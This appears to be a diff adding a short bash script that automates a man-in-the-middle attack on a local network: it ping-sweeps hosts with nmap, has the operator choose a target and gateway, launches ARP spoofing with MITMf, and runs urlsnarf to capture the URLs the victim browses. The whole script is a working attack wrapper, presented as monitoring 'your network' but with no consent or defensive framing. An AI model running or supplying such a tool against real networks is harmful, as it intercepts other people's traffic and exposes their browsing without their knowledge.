@@ -1,0 +1,81 @@
+#!/bin/bash
+
+#
+# Purpose: Examine web traffic on your network using the MITMf and urlsnarf tools. 
+#          This will give you the ability to the identify what users are browsing 
+#          on your network by providing you with their URL links.
+
+
+title="MITMF"
+DIRECTORY="/usr/bin/nmap"
+DIRECTORY_MITMF="MITMf"
+
+Install_nmap(){
+   sudo apt-get install nmap
+}
+
+Install_mitmf(){
+echo "Please follow  byt3bl33d3r's directions to install MITMf."
+firefox https://github.com/byt3bl33d3r/MITMf/wiki/Installation
+exit 0
+}
+
+Execute_mitmf(){
+   cd MITMf
+  gnome-terminal -- python mitmf.py -i ${INTERFACE} --target ${TARGET} --gateway ${GATEWAY} --arp --spoof
+   return_value=$?
+}
+
+urlsnarf(){
+   xterm -hold -e urlsnarf -i ${INTERFACE} |cut -d\" -f4
+}
+
+echo "$title"
+echo
+
+if [[ -e $DIRECTORY_MITMF ]]; then
+echo "MITMf installed"
+    else
+Install_mitmf
+fi
+
+echo
+if [[ -e $DIRECTORY ]]; then
+read -p "Enter Network Address: " NETWORK
+    else
+      echo "nmap is not installed on this system. Use 'sudo apt-get install nmap'"
+fi
+
+echo
+echo "Enter the Subnet mask for '${NETWORK}.' Your input must be in CIDR notation, such as '/24,' '/16,' '/8,' etc. If nmap is fed the wrong network and subnet, nmap will not correctly scan the network."
+echo
+read -p "Enter Subnet Mask for '${NETWORK}': " SUBNET
+
+host_discovery(){
+ nmap -sn "${NETWORK}""${SUBNET}"
+}
+
+echo "ping sweeping network..."
+host_discovery
+echo
+read -p "Choose a target: " TARGET
+
+choose_scan="Choose scan type for ${TARGET}."
+echo
+
+#    Choose the gateway's address. 
+echo
+read -p "Choose your gateway's IP Address: " GATEWAY
+
+#    Choose the interface to use. 
+echo
+iwconfig
+read -p "Choose your interface: " INTERFACE
+
+#    EXECUTE MITMF
+
+if Execute_mitmf; then
+   urlsnarf
+else
+   exit 0
+fi
